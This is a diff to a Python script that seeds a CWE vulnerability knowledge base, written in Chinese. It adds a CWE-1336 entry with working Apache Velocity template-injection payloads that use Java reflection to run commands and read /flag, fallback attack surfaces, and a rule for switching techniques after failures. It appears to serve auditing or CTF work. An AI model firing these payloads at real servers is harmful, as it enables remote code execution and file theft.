@@ -18,7 +18,7 @@ def init_vulnerability_database():
     cwe_entries = [
     {
         "id": "CWE-89",
-        "content": "名称: SQL Injection (SQL注入)\n描述: 应用程序在未正确清理外部输入的情况下，将其直接拼接到 SQL 语句中。\n影响: 数据泄露、数据库被篡改、潜在的服务器控制。\n代码表象: 字符串拼接构建的 SQL 查询 (如 `\"SELECT * FROM users WHERE name = '\" + username + \"'\"`)。\n审计策略: 追踪 HTTP 请求参数，查看其是否未经预编译 (Prepared Statements) 或 ORM 参数化绑定就直接传入了数据库执行函数 (如 `cursor.execute`, `jdbcTemplate.query`)。"
+        "content": "CWE-89 SQL Injection (SQL注入) SQLi 数据库注入\n名称: SQL Injection (SQL注入)\n描述: 应用程序在未正确清理外部输入的情况下，将其直接拼接到 SQL 语句中。\n影响: 数据泄露、数据库被篡改、潜在的服务器控制。\n代码表象: 字符串拼接构建的 SQL 查询 (如 `\"SELECT * FROM users WHERE name = '\" + username + \"'\"`)。\n审计策略: 追踪 HTTP 请求参数，查看其是否未经预编译 (Prepared Statements) 或 ORM 参数化绑定就直接传入了数据库执行函数 (如 `cursor.execute`, `jdbcTemplate.query`)。"
     },
     {
         "id": "CWE-79",
@@ -58,7 +58,11 @@ def init_vulnerability_database():
     },
     {
         "id": "CWE-917",
-        "content": "名称: Expression Language Injection / SSTI (表达式语言注入 / 模板注入)\n描述: 外部输入被直接当作模板或表达式语言进行解析。\n影响: 信息泄露，通常可升级为远程代码执行 (RCE)。\n代码表象: Python 的 Jinja2 中使用了 `render_template_string(user_input)`；Java 中的 OGNL 或 SpEL 执行了不可信字符串。\n审计策略: 检查模板引擎的使用方式。绝对禁止将用户输入作为模板字符串本身进行编译和渲染，输入只能作为数据变量传递给固定模板。"
+        "content": "名称: Expression Language Injection / SSTI (表达式语言注入 / 模板注入)\n描述: 外部输入被直接当作模板或表达式语言进行解析。\n影响: 信息泄露，通常可升级为远程代码执行 (RCE)。\n代码表象: Python 的 Jinja2 中使用了 `render_template_string(user_input)`；Java 中的 OGNL 或 SpEL 执行了不可信字符串。\n审计策略: 检查模板引擎的使用方式。绝对禁止将用户输入作为模板字符串本身进行编译和渲染，输入只能作为数据变量传递给固定模板。\n注意: Apache Velocity 的 SSTI 单独归类为 CWE-1336，使用 #set 指令语法而非 {{}} 语法，payload 不通用，请勿混用。"
+    },
+    {
+        "id": "CWE-1336",
+        "content": "名称: Improper Neutralization of Special Elements in Template Engine (模板引擎注入 / Apache Velocity SSTI)\n描述: 用户输入被直接替换进 Velocity 模板字符串，随后由 RuntimeServices.parse() 编译执行，导致攻击者注入的 Velocity 指令被服务端执行。\n影响: 通过 Java 反射链调用 Runtime.exec() 实现远程代码执行 (RCE)，可读取任意文件、执行系统命令、反弹 Shell。\n注入点特征: HTTP 参数被 line.replace('TEXT', userInput) 替换后传入 t.setData(runtimeServices.parse(reader, 'home'))，用户输入作为模板源码而非数据变量被编译执行。\n标准攻击载荷:\n  反射探测（验证注入点）:\n    #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))\n    #set($chr=$x.class.forName('java.lang.Character'))\n    #set($str=$x.class.forName('java.lang.String'))\n  命令执行（id）:\n    #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getMethod('exec',''.class.forName('[Ljava.lang.String;')).invoke($rt.getMethod('getRuntime').invoke(null),['id']))#set($out=$ex.getInputStream())#set($br=$x.class.forName('java.io.BufferedReader').getConstructors()[0].newInstance([$x.class.forName('java.io.InputStreamReader').getConstructors()[0].newInstance([$out])]))$br.readLine()\n  文件读取（/flag 或 /flag.txt）:\n    #set($x='')#set($f=$x.class.forName('java.io.File').getConstructors()[0].newInstance(['/flag']))#set($sc=$x.class.forName('java.util.Scanner').getConstructors()[0].newInstance([$f]))$sc.useDelimiter('\\\\A').next()\n注入参数: 通常为 GET 参数 ?text=<payload> 或 POST body 中替换模板占位符的字段。\n审计策略: 追踪 HTTP 参数是否流入 Velocity 的 parse()/merge() 方法，确认用户输入是否仅作为数据变量（context.put）而非模板源码本身传递。\n与 CWE-917 区别: CWE-917 泛指表达式注入（含 Jinja2/SpEL/OGNL），CWE-1336 特指模板引擎语法层注入，Velocity 使用 #set/#foreach/#macro 指令，不同于 Jinja2 的 {{}} 语法，payload 完全不通用。\nAlternative exploitation surfaces (当 JVM reflection 被封时):\n  1. #evaluate 指令: #evaluate('#set($x=7)$x') — 动态执行模板字符串\n  2. ResourceLoader: $template.merge() 或 engine.getTemplate() — 加载外部模板\n  3. EventCartridge: org.apache.velocity.app.event 接口 — 事件钩子\n  4. Uberspect: $introspector 对象 — 反射接口\n  5. #macro 递归: 定义包含自引用的宏，触发栈溢出或绕过 AST 检查\n  6. $velocityCount: 循环变量，某些版本可用于侧信道\nsurface 切换策略: 当 String.getClass/forName/Runtime 连续 3 次无输出时，\n立即切换到 #evaluate 或 EventCartridge surface，不要继续变体。"
     },
     {
         "id": "CWE-94",
@@ -253,9 +257,9 @@ def init_vulnerability_database():
         ids=[item["id"] for item in cwe_entries]
     )
 
-    print(f"✅ 成功初始化漏洞知识库！")
-    print(f"📍 存储位置: {os.path.abspath(DB_PATH)}")
-    print(f"📚 当前记录数: {collection.count()}")
+    print(f"[OK] CWE知识库初始化成功")
+    print(f"  存储位置: {os.path.abspath(DB_PATH)}")
+    print(f"  当前记录数: {collection.count()}")
 
 if __name__ == "__main__":
     init_vulnerability_database()
